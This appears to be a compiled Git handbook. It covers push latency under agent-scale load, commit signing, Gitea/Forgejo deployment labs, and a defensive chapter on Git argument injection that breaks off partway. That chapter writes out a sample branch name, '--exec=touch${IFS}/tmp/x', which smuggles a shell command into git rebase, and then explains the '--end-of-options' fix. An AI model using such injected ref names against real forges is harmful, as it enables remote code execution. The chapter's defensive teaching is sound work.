title: Git infrastructure for agent-scale development
text: Git infrastructure for agent-scale development

title: Git infrastructure for agent-scale development
text:
Thesis
Human Git workflows tolerate a few hundred milliseconds of push latency and occasional git gc pauses. Agent fleets do not. An agent in a tight loop commits or checkpoints after nearly every action; its wall-clock speed is bounded by how fast a single push completes. When thousands of agents write their own branches in one monorepo, and every push fans out into CI clones, the platform’s Git store becomes the bottleneck — not the model that wrote the patch.
This chapter teaches the demands and design principles behind GitHub’s rebuild of its Git infrastructure for agent-scale development (October 2026 engineering post). You will not reproduce GitHub’s storage stack (Spokes and its successor). You will learn why classic “full local replica per fileserver” designs hit a ceiling, which coordination you must keep, which work you can move off the push critical path, and how to reason about agent load when you operate your own forge or large monorepo.

The numbers behind the shift
All figures are from GitHub’s post (published 2026-10-06).







Signal
Figure




Git events per month (Sep 2025 → Aug 2026)
218.2 B → 473.3 B (more than 2×)


Pushes per month, year over year
0.69 B → 3.35 B (4.9×)


Commits in September 2026
7.38 B (more than 5× a year earlier)


GitHub Actions runs in September 2026
3.26 B (more than 4×)


Pull-request merges, year over year
nearly 4×


Busiest single repository, August 2026
about 1 billion requests


New architecture, internal benchmarks
up to 35× higher write throughput



The ratio that matters is that pushes grew faster than total events. The write side is where the curve bends.

title: Git infrastructure for agent-scale development
text:
Mental model
                    agents / CI / humans
                            │
            ┌───────────────┼───────────────┐
            ▼               ▼               ▼
      push / update      clone / fetch    merge queue
      (write path)       (read fan-out)   (one hot ref)
            │               │               │
            ▼               ▼               ▼
   ┌─ critical path ─┐   caches /         single tip
   │ agree on the    │   lightweight      must absorb
   │ reference update│   read workers     every merge
   └────────┬────────┘         │
            │                  │
            ▼                  ▼
   durable object store   (scale independently)
   (blobs / packs / refs)
            │
            ▼
   background compaction / GC  (off the serving path)








Pressure
Why agents make it worse
Design response




Push latency
Agent loop waits on every checkpoint
Shrink the coordinated step to the ref update; parallelize object storage, connectivity checks, scanning


Write throughput
Thousands of branches updating one repo
Decouple durability from read replicas so adding read capacity does not slow every write


Hot tip / merge queue
Trunk, release trains, merge queues funnel work onto one ref
Still needs agreement — but everything around the tip update can be independent


Read fan-out
One push → thousands of CI clones/fetches
Scale reads with lightweight workers + cache, not more durable full copies


Compaction / GC
Every write adds cleanup work
Run maintenance on separate workers against durable storage, not on the same host answering live Git



Reads are easy; writes are hard. Caches and replicas absorb clone storms. Every push must be stored durably and made visible consistently before the next agent or CI job can build on it.

title: Git infrastructure for agent-scale development
text:
Worked examples

Case 1: Measure what an agent actually waits on
An agent that “feels slow” is often waiting on the forge, not on the model. Time the two halves of a checkpoint separately: the local commit, and the push.
#!/usr/bin/env bash
# agent-push-budget.sh — time one agent-style checkpoint: commit locally, then push
set -euo pipefail
REPO="${1:?repo path}"
cd "$REPO"

printf '\n# checkpoint %s\n' "$(date -Is)" >> AGENT_CHECKPOINT.md
git add AGENT_CHECKPOINT.md

t0=$(date +%s%N)
git commit -q -m "agent: checkpoint $(date +%s)"
t1=$(date +%s%N)
git push -q origin "HEAD:refs/heads/agent/checkpoint-$$"
t2=$(date +%s%N)

echo "commit_ms=$(( (t1 - t0) / 1000000 )) push_ms=$(( (t2 - t1) / 1000000 ))"
First get a floor: push to a bare repository on the same disk, with no network, no replicas and no server-side hooks.
mkdir agentlab && cd agentlab
git init -q --bare remote.git && git clone -q remote.git work 2>/dev/null
cd work
git commit -q --allow-empty -m init && git push -q origin HEAD:main
for i in 1 2 3; do ../agent-push-budget.sh .; done
commit_ms=7 push_ms=17
commit_ms=13 push_ms=16
commit_ms=7 push_ms=17
About 17 ms is what a push costs when Git does nothing but write objects and move a ref. Now point origin at your real forge and run it again. Everything above the floor is infrastructure: network round trips, authentication, hooks, connectivity checks, replication and the quorum. If the model produces a change in 2 s and the push takes 1.5 s, almost half of the agent loop is waiting on the Git host. A human never notices that. An agent that checkpoints after every action pays it every time, which is why GitHub says commit turnaround becomes a bottleneck per agent.
Each run also left a branch behind:
cd ../remote.git
git for-each-ref --count=5 --format="%(refname)" refs/heads
refs/heads/agent/checkpoint-822206
refs/heads/agent/checkpoint-822228
refs/heads/agent/checkpoint-822251
refs/heads/main
Multiply that by thousands of agents and you have the write pattern from the post: many branches, each updated often, all landing in one repository.


Case 2: Why “add more Git replicas” can make pushes slower
Classic hosting pattern (GitHub’s historical Spokes model in broad strokes):

Keep a full on-disk copy of the repository on several fileservers (five by default).
Serve Git reads from those fast local disks.
When a push updates a reference, run a three-phase commit protocol that uses a quorum, so CI, the web UI and API clients all see a consistent repository state.

That design is excellent for a billion ordinary repositories. At the extreme tail it couples two jobs that want different scaling curves:
  durability  =  "N full copies on disk"
  read scale  =  "add another full copy"

  ⇒ every new read replica joins every write
  ⇒ push latency ≈ slowest replica in the set
So the operator move that fixes CI clone storms (more replicas) lengthens the agent push. Losing a replica hurts both capacity and durability. Losing quorum stops writes entirely.
Mental fix: separate authoritative durable storage from compute that answers Git requests. Read spikes then look like cache misses and worker scale-out, not “spin up another permanent full mirror that votes on every push.”


Case 3: What still needs coordination (and what does not)
Git semantics force agreement on reference updates. Object upload, connectivity validation, secret scanning, and pack maintenance are heavy — but most of that work need not serialize behind other writers.







Must agree
Can proceed independently (with care)




Updating refs/heads/main / merge-queue tip
Storing newly received objects


Branch-protection / required-check gates before the tip moves
Secret scanning, malware scanning of blobs


Visibility of a tip to CI and the UI after a successful push
Compaction, multi-pack-index, garbage collection



When you design or evaluate a forge:

Instrument time-to-ack for pushes separately from time-to-fully-replicated.
Move compaction off hosts that serve interactive git fetch / git push.
Treat CI clone storms as a read-scaling problem (partial clone, pack bitmaps, CDN/cache, ephemeral workers), not as a reason to enlarge the write quorum.



Case 4: Watch maintenance work pile up on the receiving side
Every push leaves work for the server. Back in the lab, the three checkpoints arrived as loose objects:
cd agentlab/remote.git
git count-objects -vH | head -3
count: 11
size: 44.00 KiB
in-pack: 0
Eleven loose objects from four tiny commits. Run the same incremental tasks a busy server needs:
git maintenance run --task=commit-graph --task=loose-objects
git count-objects -vH | head -4
count: 11
size: 44.00 KiB
in-pack: 11
packs: 1
The objects are now in a pack, but the loose copies are still there. The loose-objects task first deletes loose objects that are already packed, and only then packs the rest, so the cleanup lands on the next run:
git maintenance run --task=loose-objects
git count-objects -vH | head -4
count: 0
size: 0 bytes
in-pack: 11
packs: 1
That two-step shape is deliberate: it is safe while other Git processes read the repository at the same time. It is also the work GitHub moves off the serving path. On one host, this runs next to live pushes and fetches. Every new write adds to it, and the cost compounds as volume climbs. In the new architecture, separate workers do it directly against durable storage.
Product controls matter as much as storage. Use short-lived agent branches, a merge queue instead of a thundering herd of merges to main, branch protections so an unreviewed agent tip never becomes the default branch, and audit logs that record who (or what) pushed.

title: Git infrastructure for agent-scale development
text:
The trap
Trap: “faster clones will fix agent scale.” Partial clone, sparse checkout, and shallow fetch are necessary for large trees — and they only help the read side. Agent loops are write-latency and write-throughput problems. If every agent still waits on a quorum of full disk replicas, clone speedups do not unblock the checkpoint loop.
Trap: “drop coordination to go faster.” Skipping tip agreement breaks CI and humans equally: two agents can believe they both landed on main. The rebuild thesis is not “no coordination”; it is coordinate only what Git requires, and do everything else in parallel or in the background.
Trap: “agents replace governance.” Higher commit rates make branch protections, required reviews, and audit trails more important, not less. GitHub’s design principles explicitly keep people in control of review and approval as automation volume grows.

title: Git infrastructure for agent-scale development
text:
The boring rule
Treat every agent as a writer whose throughput is capped by push ack latency, and treat every successful push as a read fan-out event. Scale durability and read compute on different axes; keep ref-update agreement; move compaction off the serving path. Measure push wall time in the agent loop the same way you measure model tokens — it is part of the product.

title: Git infrastructure for agent-scale development
text:
Try this

Time git push for a one-line commit to a shared branch on your forge. Compare to a push to a personal fork. Note the delta.
Enable git maintenance with the incremental strategy on a large clone and confirm commit-graph / MIDX work happens on a schedule, not during interactive status (see the companion git maintenance chapter).
Sketch your hosting topology: for each replica, mark whether it is durable truth, read cache, or accidentally both. If every box is both, you have redrawn the classic ceiling.

title: Git infrastructure for agent-scale development
text:
Verification

Primary source: GitHub Engineering, Building Git infrastructure for agent-scale development (2026-10-06, updated 2026-10-07) — figures for events/month, pushes, Actions runs, and the Spokes durability-vs-read-scale tradeoff are taken from that post.
Concepts cross-checked against Git’s documented maintenance / commit-graph / multi-pack-index behaviour (no GitHub-internal services were exercised).
Cases 1 and 4 were run on this box with Git 2.47.3 against a local bare repository (2026-10-15 IST). Outputs are pasted from those runs; the local push time is a floor, not a forge measurement.
This host did not call GitHub private APIs or reproduce Spokes quorum behaviour.

title: Git infrastructure for agent-scale development
text:
Sources

GitHub Engineering — Building Git infrastructure for agent-scale development
Git — git maintenance, commit-graph, multi-pack-index
Optional comparison (different problem domain, cited only as parallel “source control under agent load” thinking): Anthropic Engineering — Redesigning source control

title: Theory
text:
Theory: Signatures Bind a Key to a Hash; History Still Contains Secrets
A signed commit proves a key holder produced that object. It does not encrypt the tree. A secret once hashed is in every clone that fetched it.

title: Theory
text:
Invariants

SSH or GPG signing covers the commit/tag object.
Forges display verified if the key is uploaded.
git filter-repo rewrites hashes; everyone must reclone.
Pre-commit secret scanning is courtesy; rotation is mandatory.

commit hash ── signed by key K
forge matches K to account
secret blob ── still in pack until rewrite + rotate

title: Theory
text:
What can break

Signing with a key the forge does not know.
Revert of a secret (blob remains).

title: Theory
text:
How to read this chapter
Sign, secrets, audit trails, scanning, lab to remove a secret.

title: Signed Commits and Tags
text:
Signed Commits and Tags
After this page you can sign commits and annotated tags with SSH (preferred on a Linux desk in 2026) or OpenPGP, prove a signature locally, and get a forge Verified badge by uploading the matching public key. A signature binds a key to a commit or tag object. It does not encrypt the tree, and it does not stop a secret that already landed in history.
Desk repos for the labs: ~/desk/desk-api (chapter 3). Linux is the primary host.

title: Signed Commits and Tags
text:
What a signature covers
commit / annotated tag object
        │
        ▼
  payload hashed ── signed by key K
        │
        ▼
  forge matches K to your account → Verified








Kind
Signs
Typical tool




Commit
The commit object (tree + parents + author/committer + message)
git commit -S


Annotated tag
The tag object (points at a commit + tagger + message)
git tag -s


Lightweight tag
Nothing cryptographic — name only
Avoid for releases



Unsigned history is still valid Git. Signing is an authenticity layer you and your forge agree on.

title: Signed Commits and Tags
text:
SSH signing (boring default)
OpenSSH 8.2+ can sign Git objects. Git 2.34+ speaks gpg.format=ssh. You reuse the same key you already use for git@ remotes.

One-time setup
# Prefer an Ed25519 key dedicated to signing if your org splits roles
ls -l ~/.ssh/id_ed25519.pub

git config --global gpg.format ssh
git config --global user.signingKey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
git config --global tag.gpgSign true
user.signingKey for SSH is the public key path (or the literal key::ssh-ed25519 AAAA… form). Git asks ssh-keygen -Y sign under the hood; your agent holds the private key.
Upload the same public key to the forge as a signing key (GitHub: Settings → SSH and GPG keys → New SSH key → Key type Signing Key). Authentication keys and signing keys can be the same material, but the forge must list it for signing or the badge stays unsigned.


Sign a commit and prove it locally
cd ~/desk/desk-api
git switch -c lab/signed-commits
echo "signed-lab $(date -Iseconds)" >> NOTES.md
git add NOTES.md
git commit -m "lab: demonstrate SSH-signed commit"
# -S is implied when commit.gpgsign=true; pass -S explicitly if you left that unset

git log -1 --show-signature
git verify-commit HEAD
Expected shape (wording varies by Git/OpenSSH version):
Good "git" signature for … with ED25519 key SHA256:…
If verification says the key is unknown, configure an allowed-signers file (next section) or rely on the forge UI after push.


Allowed signers (local trust)
SSH verification needs a map from principals to public keys — the allowed-signers file:
mkdir -p ~/.config/git
cat >> ~/.config/git/allowed_signers <<'EOF'
you@example.com namespaces="git" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA… comment
EOF
git config --global gpg.ssh.allowedSignersFile ~/.config/git/allowed_signers
git verify-commit HEAD
Principals should match the email (or forge identity) you care about. namespaces="git" limits the key to Git signatures. Without this file, git verify-commit may report a good cryptographic signature with an untrusted principal — same idea as OpenPGP “Good signature” with unknown trust.


Sign an annotated release tag
git tag -s v0.0.0-lab -m "lab signed tag"
git verify-tag v0.0.0-lab
git show --show-signature v0.0.0-lab
Lightweight tags (git tag v0.0.0-lab without -s / -a) carry no signature. Release process: annotated + signed.

title: Signed Commits and Tags
text:
OpenPGP signing (when policy requires it)
Some orgs still mandate OpenPGP. Install GnuPG, generate or import a key, then:
gpg --list-secret-keys --keyid-format=long
# Copy the signing key fingerprint (40 hex), not a short ID

git config --global gpg.format openpgp   # or unset; openpgp is the historical default
git config --global user.signingKey REPLACE_WITH_FINGERPRINT
git config --global commit.gpgsign true

git commit -S -m "lab: OpenPGP-signed commit"
git log -1 --show-signature
Export the public key and upload it to the forge as a GPG key. Prefer fingerprint match over short key IDs. Keep ~/.gnupg mode 700; never commit secret key material.
You can keep SSH for auth remotes and OpenPGP only for signing by setting gpg.format openpgp and user.signingKey to the fingerprint while SSH continues to handle git@ URLs.

title: Signed Commits and Tags
text:
Selective signing and overrides







Goal
Command / config




Always sign commits
commit.gpgsign=true


Always sign annotated tags
tag.gpgSign=true


One unsigned commit
git commit --no-gpg-sign


One signed commit when defaults are off
git commit -S


Repo-only policy
omit --global; set the same keys in this repo’s .git/config



CI bots that merge with a forge token often produce unsigned merge commits unless the bot has its own signing key. Branch protection “require signed commits” applies to the commits you push; understand whether merges rewrite history or add unsigned merge nodes.

title: Signed Commits and Tags
text:
Push and forge Verified
git push -u origin lab/signed-commits
git push origin v0.0.0-lab
On the forge, open the commit: a Verified badge means the signature matched a signing key attached to the author account. No badge usually means: wrong key uploaded, auth-only SSH key not marked for signing, or author email does not match the forge account.
# Inspect what you actually pushed
git cat-file -p HEAD | head -20
# Look for gpgsig / signed tag blocks in the object

title: Signed Commits and Tags
text:
Safety

Signing proves who held key K, not that the diff is safe to run. Still review patches.
A compromised laptop with an unlocked agent can sign forever — use short agent lifetimes, hardware keys, or confirm prompts where your stack supports them.
Rewriting signed history (rebase, filter-repo) drops or invalidates old signatures; re-sign deliberately after rewrites.
Do not paste private keys or ssh-keygen -Y sign intermediate files into tickets.
Tag signing and commit signing are separate habits. Releases need both a signed tag and a review of the commit it points at.

title: Signed Commits and Tags
text:
Hands-on checklist

Configure SSH signing (gpg.format, user.signingKey, commit.gpgsign).
Create lab/signed-commits, make one signed commit, run git verify-commit HEAD.
Add an allowed-signers entry for your principal; re-verify.
Create v0.0.0-lab with git tag -s; run git verify-tag.
Push branch + tag; confirm Verified on the forge for both.
Optional: make one --no-gpg-sign commit and contrast the forge UI.

Symptom
Likely cause
Fix




cannot sign / ssh signing error
Agent empty or wrong key path
ssh-add -l; fix user.signingKey


Good signature, untrusted
No allowed-signers / trust
Configure gpg.ssh.allowedSignersFile or forge upload


Forge shows Unverified
Key not uploaded as signing key
Add signing key; match author email


tag.gpgSign ignored
Lightweight tag
Use git tag -s / annotated tags


Works locally, CI unsigned
Bot has no signing key
Accept for merges or equip the bot

title: Theory
text:
Theory: A Single Binary is an Architectural Statement
Gitea/Forgejo keep Git hosting in one Go process, SQLite-capable. That is a complexity budget. The Forgejo fork is a governance and license theory, not a protocol fork.

title: Theory
text:
Invariants

SQLite + local disk is enough until it is not (locking, size).
Actions-compatible CI is optional, not the product core. The runner is a second process.
Codeberg is Forgejo-as-a-service with community ops (chapter 29).
The Forgejo fork did not change the Git protocol. A remote is still SSH or HTTP.

one binary ──► git repos on disk
            ──► SQLite/Postgres
            ──► optional runners

title: Theory
text:
What can break

Expecting GitLab-class HA from a hobby compose file.
Treating a current Gitea database as a drop-in for current Forgejo. The hard fork ended that promise.

title: Theory
text:
How to read this chapter
Origins, fork, comparison, scale, two labs, when it fits.

title: Origins and Philosophy
text:
Origins and Philosophy
After this page you can say what problem a single-binary forge is built to solve, and which project solved it first.

title: Origins and Philosophy
text:
Two forks, one shape
Gogs was a lightweight Git server in Go. Development sat behind one maintainer. In 2016 contributors forked it and called the result Gitea: the same idea, with a group that could review and release.
The idea is small on purpose.
one Go process
  ├── Git repositories as bare repos on disk
  ├── issues, pull requests, users  →  one database
  └── HTTP on port 3000, and SSH for the Git remote
Default database is SQLite, a file next to the repositories. Postgres and MySQL are configuration, not a requirement. There is no separate Rails app, no Gitaly, no search cluster. Chapter 23 named those boxes. This product leaves most of them empty until you opt in.

title: Origins and Philosophy
section: What you get on the first afternoon
text:
What you get on the first afternoon
A Gitea or Forgejo instance gives a small team:

repositories, with SSH and HTTP remotes (chapter 11)
issues and pull requests
a web UI to browse files and diffs
organizations, teams, and repository permissions
webhooks, when you want an outside CI to notice a push (chapter 32)

Packages, Actions, and a container registry exist. They are extra processes and extra disks. The core stays the binary plus the data directory.

title: Origins and Philosophy
section: What this shape refuses to be
text:
What this shape refuses to be
GitLab’s theory is one application for the whole lifecycle (chapter 24): Git, CI, registry, and security scanning in one product. Gitea’s theory is the opposite budget. A desk, a lab, or a small company can run it on a machine that would struggle to boot GitLab Omnibus.
That budget is the point. The moment the database, the Git files, and CI runners all need to scale independently, you have left the afternoon install and entered chapter 36. The binary does not stop you. It also does not hide the work.
The next page is why Forgejo exists as a second project with this same shape.

title: The Forgejo Fork
text:
The Forgejo Fork
After this page you can explain why Forgejo split from Gitea, and what that split changes for an operator.

title: The Forgejo Fork
text:
Who holds the name
Gitea’s code was community-run. In 2022 a for-profit company, Gitea Ltd, took the trademark and the project’s direction. An open letter from contributors went unanswered. In October 2022 Codeberg and other operators published Forgejo as a fork.
Codeberg e.V., a non-profit in Berlin, holds the Forgejo domains. Forgejo has not registered a trademark. The public forge at codeberg.org runs Forgejo. Chapter 29 is that hosted instance. This chapter is the software you run yourself.
Gogs (single maintainer)
  └── Gitea, 2016          Gitea Ltd, MIT, company edition
        └── Forgejo, Oct 2022
              soft fork through 2023
              hard fork, early 2024     Codeberg e.V., GPL-3.0-or-later since v9

title: The Forgejo Fork
text:
Soft fork, then hard fork
Through 2023 Forgejo was a soft fork: it tracked Gitea and stayed a drop-in. Changing the download URL was enough to upgrade a Gitea server onto Forgejo.
On 15 February 2024 the project became a hard fork. Stable Forgejo stopped promising to contain all of Gitea. The codebases diverge on purpose, so each side can change without rebasing onto the other. A Gitea database from the 1.22 era is the last generation where people treated the switch as a binary swap. Later pairs need the Forgejo upgrade guide for those two versions. Do not point a new Forgejo binary at a production Gitea data directory and hope.

title: The Forgejo Fork
text:
What actually changed
The Git protocol did not change. Clients, remotes, and hooks from Parts I–III work against either UI.
What changed is governance and the license:









Gitea
Forgejo




Steward
Gitea Ltd
Codeberg e.V.


License
MIT
MIT through v8; GPL-3.0-or-later from v9


Contributor terms
copyright assignment to the company
no copyright assignment


Paid edition
Enterprise
none


Developed on
GitHub
Forgejo



GPL-3.0-or-later means a modified Forgejo you ship to others comes with source under the same terms. MIT does not require that. Gitea can legally ship a closed Enterprise build on the same code. Forgejo’s license is how the project refuses that path.
Day to day, issues, pull requests, and the settings screens still feel like the same product. Actions exist on both (Forgejo Actions and Gitea Actions), with a runner you install separately. Federation between Forgejo instances is a Forgejo project and is not something to design a company on until you have tried it on the version you run.
The next page puts Forgejo, Gitea, and GitLab in one table. The lab pins Forgejo 15 LTS, not whatever tag your registry calls latest.

Gitea vs Forgejo vs GitLab
After this page you can choose among the three from the constraint you actually have, not from a feature checklist.

Same afternoon, different contracts
Gitea and Forgejo are one architectural family. GitLab is a different product that also hosts Git. Versions below are the ones this book checked in September 2026.

title: Gitea vs Forgejo vs GitLab
text:
What is not a difference
Push, fetch, branches, and review comments are Git plus a database row. A developer who learned chapters 8–11 does not relearn them here. The UI names a pull request; Gerrit (chapter 27) names a change. Under both, the bytes are still a branch on a remote.
Webhooks out of either lightweight forge are the same idea as GitLab’s: HTTP to your CI when a ref moves. Chapter 32 is that integration. This chapter does not stand up a runner.

title: Gitea vs Forgejo vs GitLab
section: How to read the license row
text:
How to read the license row
Pick Forgejo when the operator must be able to show that the forge itself stays free software, with a non-profit holding the name and no Enterprise fork of the same tree.
Pick Gitea when the MIT terms are a requirement (you need to ship a closed product derived from the forge) or you are already paying for Gitea Enterprise and the company build is the point.
Pick GitLab when the requirement is CI, a container registry, and security scanning inside one installer, and you can afford the machine that installer expects. A 2 GB lab VM is a Forgejo conversation. It is a bad GitLab conversation.
The next page is how the lightweight shape is deployed, and where SQLite stops being the right database.

title: Deployment and Scaling
text:
Deployment and Scaling
After this page you can sketch a Forgejo or Gitea layout and name the first limit you will hit.

title: Deployment and Scaling
section: One directory is the whole server
text:
One directory is the whole server
The container’s data directory holds the bare repositories, the database, and the config. On the standard image that directory is /data. SQLite, when you leave the database unset, is a file in that tree (gitea.db, including on Forgejo: the filename stayed). Config is app.ini under the same tree.
./data/                      (bind mount → /data)
  git/repositories/          bare repos
  gitea/gitea.db             SQLite, until you move it
  gitea/conf/app.ini         generated on first start
Environment variables of the form FORGEJO__section__KEY write app.ini for you. Gitea uses the same pattern with the prefix GITEA__. A value already stored in app.ini is not cleared by unsetting the variable. Edit the file, or start from an empty data directory.
Two images ship:








Image
Data mount
SSH inside the container




codeberg.org/forgejo/forgejo:15
/data
port 22


codeberg.org/forgejo/forgejo:15-rootless
/var/lib/gitea
port 2222



The lab uses the first. Rootless is the same product with a different mount and a different internal SSH port. Mirror data.forgejo.org when codeberg.org is not reachable from the build machine.

title: Deployment and Scaling
text:
Where it stops being small
SQLite has one writer. A desk, a class, or a company of tens of people is the design center. A busy public forge is not. The move is mechanical:

Keep Git bytes on local disk. NFS for the repository directory is a corruption risk unless you already know that filesystem’s locking story. Chapter 36 is the storage chapter.
Move the database to Postgres when SQLite lock time shows up in the logs. Set FORGEJO__database__DB_TYPE=postgres and a host. Do this before the file is large, and take a backup first (chapter 37).
Put LFS and package blobs on object storage when the data disk fills with artifacts, not when the Git packs do.
Scale CI by adding runners, not by cloning the Forgejo process. Actions are optional. The server is still one writer of its own database.

There is no supported active-active pair of Forgejo nodes over one SQLite file. High availability here means backups, a second disk, and a practiced restore. GitLab’s multi-node shape is a different product.

title: Deployment and Scaling
text:
Upgrades
Pin an image tag (:15 or :15.0), not latest. Moving from major N to N+1 is a manual upgrade with a backup of /data in front of it. Patch releases inside 15.0 replace the container and keep the directory.
Gitea’s image is docker.io/gitea/gitea:1.27. Same directory layout, same port story, GITEA__ environment names. Do not run both compose projects against one data directory.
The hands-on page brings Forgejo up, pushes desk-api, then shows the Gitea file as the same lab with the image line changed.

title: Hands-On: Gitea and Forgejo
text:
Hands-On: Gitea and Forgejo
Bring up Forgejo 15 on Linux, push desk-api, tear it down, then read the Gitea file as the same lab with one image line changed.
Examples were checked against the Forgejo 15 LTS docs and Gitea 1.27. You need Docker, or Podman with podman compose. The commands below say docker compose. On Podman, substitute podman compose. Do not point this lab at a Forgejo you already use.

title: Hands-On: Gitea and Forgejo
text:
Forgejo
Host port 3000 is HTTP. Host port 2222 is Git SSH, so the lab does not take the machine’s own sshd on port 22. If either host port is already taken, stop. Another forge is probably there.
mkdir -p ~/desk/forgejo-lab
cd ~/desk/forgejo-lab
mkdir -p data
cat > compose.yml <<'EOF'
services:
  server:
    image: codeberg.org/forgejo/forgejo:15
    environment:
      USER_UID: "1000"
      USER_GID: "1000"
      FORGEJO__server__DOMAIN: localhost
      FORGEJO__server__ROOT_URL: http://localhost:3000/
      FORGEJO__server__SSH_PORT: "2222"
      FORGEJO__server__HTTP_PORT: "3000"
    restart: unless-stopped
    volumes:
      - ./data:/data
    ports:
      - "3000:3000"
      - "2222:22"
EOF
docker compose up -d
docker compose ps
USER_UID should be your numeric id (id -u) if 1000 is not you, or the data directory will be owned by the wrong account. Wait until the HTTP port answers:
curl -fsS -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3000/
A 200 or a 303 is enough. Open http://localhost:3000/ in a browser. The installation page asks for the administrator. Create that account. Leave the database on SQLite. Submit, then sign in.
Create a repository named desk-api. Empty is fine. The UI shows two clone URLs. The SSH one should contain :2222. If it says port 22, SSH_PORT did not land in app.ini and the compose environment block needs another look.

title: Hands-On: Gitea and Forgejo
text:
Push desk-api
~/desk/desk-api is the project from chapter 3. Add this forge as a second remote (chapter 11). Use the HTTP URL from the UI if you have not loaded an SSH key into the forge yet.
cd ~/desk/desk-api
git remote add forgejo http://127.0.0.1:3000/ADMIN/desk-api.git
git push -u forgejo main
Replace ADMIN with the username you just created. The password is the one from the installation page. After the push, the file list in the browser matches git log --oneline locally.
SSH, once the UI has your public key:
git remote set-url forgejo ssh://git@127.0.0.1:2222/ADMIN/desk-api.git

title: Hands-On: Gitea and Forgejo
text:
Tear it down
cd ~/desk/forgejo-lab
docker compose down
./data is still on disk. docker compose down does not delete that directory. Delete ~/desk/forgejo-lab when you are finished with the lab. Leave ~/desk/desk-api in place, and remove the remote if you do not want it:
cd ~/desk/desk-api
git remote remove forgejo

title: Hands-On: Gitea and Forgejo
text:
The Gitea file
Do not start this while the Forgejo container is still bound to 3000 and 2222. Same lab, other project:
mkdir -p ~/desk/gitea-lab/data
cd ~/desk/gitea-lab
cat > compose.yml <<'EOF'
services:
  server:
    image: docker.io/gitea/gitea:1.27
    environment:
      USER_UID: "1000"
      USER_GID: "1000"
      GITEA__server__DOMAIN: localhost
      GITEA__server__ROOT_URL: http://localhost:3000/
      GITEA__server__SSH_PORT: "2222"
      GITEA__server__HTTP_PORT: "3000"
    restart: unless-stopped
    volumes:
      - ./data:/data
    ports:
      - "3000:3000"
      - "2222:22"
EOF
docker compose up -d, the same installation page, a repository, a push, docker compose down. The screen is Gitea’s. The Git remote is still just a URL.

title: Hands-On: Gitea and Forgejo
text:
Done when

Forgejo’s UI showed desk-api after git push
the SSH clone URL contained port 2222
both compose projects are down, and ~/desk/desk-api still has its history
you can point at the one line that differs between the two files (the image, and FORGEJO__ versus GITEA__)

title: When Gitea or Forgejo Fits
text:
When Gitea or Forgejo Fits
After this page you can decide whether this shape is the forge for the job in front of you.

title: When Gitea or Forgejo Fits
text:
Choose it when
The requirement is Git hosting for a desk, a course, or a company that can name every user. You want issues and pull requests, you can live with CI as a webhook or a separate runner, and you would rather administer one data directory than a platform of services.
Forgejo is the default in this book for that job:

the steward is a non-profit, and the license from v9 on is GPL-3.0-or-later
15.0 is a long-term line (security support through 15 July 2027)
Codeberg is the same software, operated by someone else, when you do not want a server (chapter 29)

Gitea is the right lightweight forge when MIT is the constraint, or when a support contract with Gitea Ltd is the constraint. The operator experience is the sibling of Forgejo, not a different architecture.
Run it yourself when the repositories must stay on a machine you control. Use Codeberg when the code can live on a public community forge and you only need an account.

title: When Gitea or Forgejo Fits
text:
Choose something else when

You need merge trains, a built-in registry, dependency scanning, and GitLab CI on day one. That is chapter 24, and it is a larger machine.
Review must be a stack of patchsets with a Change-Id. That is Gerrit (chapter 27), not a pull-request UI with a different coat of paint.
The company standard is already GitHub or GitLab.com and the lock-in discussion in chapter 22 has been accepted. A second forge “for practice” is this lab. A second forge “for production beside the real one” is two metadata stores and one confused team.
You expect two nodes to share one SQLite file and call it high availability. Stop at the previous page and read chapter 37 before you draw that diagram.

title: When Gitea or Forgejo Fits
section: A decision you can write down
text:
A decision you can write down
small team, self-hosted, free-software forge  →  Forgejo 15 LTS
small team, MIT or a Gitea contract           →  Gitea 1.27
hosted community, no server to patch          →  Codeberg
CI and registry inside the installer          →  GitLab
Whichever line you pick, the developer workflow does not restart. desk-api is still a repository, the remote is still a URL, and force-push rules from chapter 11 still apply on main. Part V is what changes when you are the operator of that URL for other people: identity, branch protection, and backups. The binary will not do those for you.

title: Git argument injection and -- / --end-of-options
text:
Git argument injection and -- / --end-of-options
When a forge or CI wrapper builds a git argv from user-controlled ref names, a string that looks like a branch can be parsed as a flag. That is CWE-88 (argument injection). The boring defense is the same one POSIX and modern Git document: put -- or --end-of-options before operands so later tokens cannot become options. This chapter teaches that defense using the public Rapid7 analysis of Gogs (CVE-2026-52806, fixed in Gogs 0.14.3). It does not give a live exploit against any service — only enough mechanism to review your own wrappers.

title: Git argument injection and -- / --end-of-options
text:
Thesis

git rebase base head is safe only if base and head cannot be mistaken for flags. git rebase --exec=… runs a shell command after each replayed commit. If an attacker can make a “branch name” start with --exec=, and your code passes it without an end-of-options marker, you handed them RCE in the Git worker user.

title: Git argument injection and -- / --end-of-options
text:
Mental model
  User-controlled ref string
           │
           ▼
  argv:  git  rebase  --quiet  <base>  <head>
                       │
                       ├─ if <base> is "--exec=touch${IFS}/tmp/x"
                       │     Git parses --exec, runs sh -c …
                       │
                       └─ if you insert a barrier:
  argv:  git  rebase  --quiet  --  <base>  <head>
  or:    git  rebase  --quiet  --end-of-options  <base>  <head>
                       │
                       └─ <base> is data, even if it starts with -







Marker
Role




--
Classic “end of options”; remaining args are operands


--end-of-options
Git-specific explicit barrier (used heavily in hardened git-module / forge code)


rev-parse --verify
Proves a ref exists — does not prove it is safe as an argv operand

title: Git argument injection and -- / --end-of-options
text:
Worked examples

Case 1: Why --exec is a loaded footgun
git rebase accepts --exec <cmd> (run sh -c after each commit). That is a legitimate feature for maintainers. It becomes an injection primitive only when untrusted strings are placed where Git expects options or where a missing -- lets a operand look like an option.
Defensive sketch (Go-shaped, illustrative — pattern, not a Gogs patch):
// safe_rebase.go — pattern only: always barrier before ref operands
// BAD:  exec.Command("git", "rebase", "--quiet", baseBranch, headBranch)
// GOOD:
cmd := exec.Command(
    "git", "rebase", "--quiet",
    "--end-of-options", // or "--"
    baseBranch,
    headBranch,
)
Never build the cmdline as a single shell string (sh -c "git rebase …"+branch). Prefer argv arrays; still use -- / --end-of-options because the danger is Git’s option parser, not only the system shell.


Case 2: Lesson from CVE-2026-52806 (Gogs), fixed 0.14.3
Public facts from Rapid7’s write-up (May–June 2026):

Gogs’ Merge() rebase path called roughly git rebase --quiet <BaseBranch> <head> via raw process.ExecDir — no -- barrier.
BaseBranch could be a ref whose name was literally shaped like --exec=… (Git allows $, {, }, =, - in ref names).
